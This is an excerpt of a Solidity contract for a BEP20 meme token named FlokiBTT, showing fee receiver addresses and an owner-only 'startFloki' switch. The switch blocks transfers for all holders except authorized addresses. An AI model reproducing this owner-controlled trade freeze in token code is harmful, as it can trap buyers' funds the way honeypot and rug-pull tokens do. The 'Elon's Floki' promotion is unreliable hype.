...
/**
 * FlokiBTT (FBTT)
 * Elon's Floki gives BTT rewards!
 * 
 *  ______ _       _    _______ _____ _____ 
 * |  ___| |     | |  (_) ___ \_   _|_   _|
 * | |_  | | ___ | | ___| |_/ / | |   | |  
 * |  _| | |/ _ \| |/ / | ___ \ | |   | |  
 * | |   | | (_) |   <| | |_/ / | |   | |  
...
contract FlokiBTT is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "FlokiBTT";
    string constant _symbol = "FBTT";
    ...
    constructor () Auth(msg.sender) {
        ...
        // Tax addresses
        autoLiquidityReceiver = 0x1454B4FF756425d86a4FeaE65C7eb9A87Bd563e1;
        marketingFeeReceiver = 0x74d110CF4BF2069e9D13e842D4C19D71C4D7be87;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if(!authorizations[sender] && !authorizations[recipient]){
            require(happyFloki,"Floki is not happy");
        }
    ...
    // Activate Floki
    function startFloki(bool _status) public onlyOwner {
        happyFloki = _status;
    }
